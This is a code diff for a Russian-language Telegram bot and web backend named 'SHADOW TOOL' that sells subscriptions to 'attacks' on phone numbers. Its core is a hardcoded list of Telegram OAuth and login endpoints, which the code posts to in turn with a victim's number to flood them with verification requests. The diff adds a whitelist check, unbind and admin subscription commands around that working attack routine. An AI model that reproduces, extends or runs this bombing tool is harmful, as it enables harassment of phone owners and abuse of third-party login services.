@@ -22,7 +22,6 @@ BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
 ADMIN_IDS_RAW = os.environ.get('ADMIN_ID', '')
 WHITELIST_GIST_URL = os.environ.get('WHITELIST_GIST_URL', '')
 
-# Парсим админов
 ADMIN_IDS = []
 if ADMIN_IDS_RAW:
     for part in ADMIN_IDS_RAW.split(','):
@@ -50,7 +49,6 @@ DB_PATH = os.path.join(VOLUME_PATH, 'shadowtool.db')
 conn = sqlite3.connect(DB_PATH, check_same_thread=False)
 cursor = conn.cursor()
 
-# Таблицы
 cursor.execute('''
     CREATE TABLE IF NOT EXISTS web_users (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -92,10 +90,8 @@ cursor.execute('''
 ''')
 conn.commit()
 
-# Временные коды привязки
 bind_codes = {}
 
-# Список URL для атаки
 ATTACK_URLS = [
     'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
     'https://translations.telegram.org/auth/request',
@@ -109,7 +105,6 @@ ATTACK_URLS = [
     'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin'
 ]
 
-# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
 def hash_password(password):
     return hashlib.sha256(password.encode()).hexdigest()
 
@@ -118,6 +113,25 @@ def generate_token():
 
 def is_admin(user_id):
     return user_id in ADMIN_IDS
+
+async def is_phone_whitelisted(phone):
+    if not WHITELIST_GIST_URL:
+        return False
+    
+    clean = ''.join(c for c in phone if c.isdigit())
+    if clean.startswith('8'):
+        clean = '7' + clean[1:]
+    if not clean.startswith('7'):
+        clean = '7' + clean
+    normalized = '+' + clean
+    
+    try:
+        resp = await asyncio.to_thread(requests.get, WHITELIST_GIST_URL + '?t=' + str(int(datetime.now().timestamp())), timeout=10)
+        data = resp.json()
+        whitelist = data.get('phones', [])
+        return any(item.get('number') == normalized for item in whitelist)
+    except:
+        return False
 
 # ========== FLASK API ==========
 flask_app = Flask(__name__)
@@ -200,7 +214,6 @@ def me():
     if not row:
         return jsonify({'error': 'Invalid or expired token'}), 401
     
-    # Также возвращаем статус привязки Telegram
     cursor.execute('SELECT telegram_id FROM telegram_binds WHERE user_id=?', (row[0],))
     bind = cursor.fetchone()
     
@@ -268,11 +281,9 @@ def generate_bind_code():
     
     user_id = row[0]
     
-    # Генерируем 8-значный код
     code = secrets.token_hex(4).upper()
     bind_codes[code] = user_id
     
-    # Автоудаление через 5 минут
     def remove_code():
         import time
         time.sleep(300)
@@ -292,13 +303,17 @@ async def send_attack_log(telegram_id, message):
     except:
         pass
 
-async def perform_attack(phone, telegram_id):
+async def perform_attack(phone, telegram_id, user_id):
+    # Проверка белого списка
+    if await is_phone_whitelisted(phone):
+        await send_attack_log(telegram_id, "⛔ Номер в белом списке. Атака заблокирована.")
+        return
+    
     success = 0
     total = len(ATTACK_URLS)
     
     for i, url in enumerate(ATTACK_URLS):
         try:
-            # Используем requests для синхронного запроса в асинхронном контексте
             await asyncio.to_thread(requests.post, url, data={'phone': phone}, timeout=5)
             success += 1
             await send_attack_log(telegram_id, f"✅ Запрос {i+1}/{total} отправлен")
@@ -308,21 +323,23 @@ async def perform_attack(phone, telegram_id):
     
     await send_attack_log(telegram_id, f"🎯 <b>АТАКА ЗАВЕРШЕНА!</b>\n📞 Номер: {phone}\n✅ Успешно: {success}/{total}")
 
-@dp.message_handler(commands=['start'])
+@dp.message_handler(commands=['start', 'help'])
 async def cmd_start(message: Message):
     await message.answer(
         "🔰 <b>SHADOW TOOL</b>\n\n"
         "📌 <b>Доступные команды:</b>\n"
         "/bind КОД - привязать Telegram к аккаунту на сайте\n"
+        "/unbind - отвязать Telegram от аккаунта\n"
         "/attack +79001234567 - запустить атаку\n"
         "/status - проверить статус подписки\n"
-        "/help - это сообщение",
+        "/start - это сообщение\n\n"
+        "<b>👑 Админ-команды:</b>\n"
+        "/addsub логин дни - выдать подписку\n"
+        "/delsub логин - удалить подписку\n"
+        "/subs - список активных подписок\n"
+        "/users - список пользователей",
         parse_mode='HTML'
     )
-
-@dp.message_handler(commands=['help'])
-async def cmd_help(message: Message):
-    await cmd_start(message)
 
 @dp.message_handler(commands=['bind'])
 async def cmd_bind(message: Message):
@@ -339,7 +356,6 @@ async def cmd_bind(message: Message):
     
     user_id = bind_codes[code]
     
-    # Проверяем, не привязан ли уже этот Telegram к другому аккаунту
     cursor.execute('SELECT user_id FROM telegram_binds WHERE telegram_id=?', (user_tg_id,))
     existing = cursor.fetchone()
     if existing:
@@ -352,10 +368,21 @@ async def cmd_bind(message: Message):
     ''', (user_id, user_tg_id, datetime.now().isoformat()))
     conn.commit()
     
-    # Удаляем использованный код
     del bind_codes[code]
     
     await message.answer("✅ Telegram привязан к аккаунту!\nТеперь используйте /attack +79001234567")
+
+@dp.message_handler(commands=['unbind'])
+async def cmd_unbind(message: Message):
+    user_tg_id = message.from_user.id
+    
+    cursor.execute('DELETE FROM telegram_binds WHERE telegram_id=?', (user_tg_id,))
+    conn.commit()
+    
+    if cursor.rowcount > 0:
+        await message.answer("✅ Telegram отвязан от аккаунта")
+    else:
+        await message.answer("❌ Этот Telegram не был привязан")
 
 @dp.message_handler(commands=['status'])
 async def cmd_status(message: Message):
@@ -410,7 +437,7 @@ async def cmd_attack(message: Message):
     
     user_id = row[0]
     
-    cursor.execute('SELECT end_date, status FROM subscriptions WHERE user_id=? AND status="active" AND end_date > ?', 
+    cursor.execute('SELECT end_date FROM subscriptions WHERE user_id=? AND status="active" AND end_date > ?', 
                    (user_id, datetime.now().isoformat()))
     sub = cursor.fetchone()
     
@@ -420,17 +447,16 @@ async def cmd_attack(message: Message):
     
     phone = args
     
-    # Простая проверка формата
     clean_phone = ''.join(c for c in phone if c.isdigit())
     if not clean_phone or len(clean_phone) < 10:
         await message.answer("❌ Неверный формат номера. Пример: +79001234567")
         return
     
-    await message.answer(f"🚀 <b>Начинаю атаку на {phone}</b>\n\nЭто может занять до 30 секунд...", parse_mode='HTML')
+    await message.answer(f"🚀 <b>Начинаю атаку на {phone}</b>\n\nПроверка белого списка...", parse_mode='HTML')
     
-    # Запускаем атаку в фоне
-    asyncio.create_task(perform_attack(phone, user_tg_id))
+    asyncio.create_task(perform_attack(phone, user_tg_id, user_id))
 
+# ========== АДМИН-КОМАНДЫ ==========
 @dp.message_handler(commands=['users'])
 async def cmd_users(message: Message):
     if not is_admin(message.from_user.id):
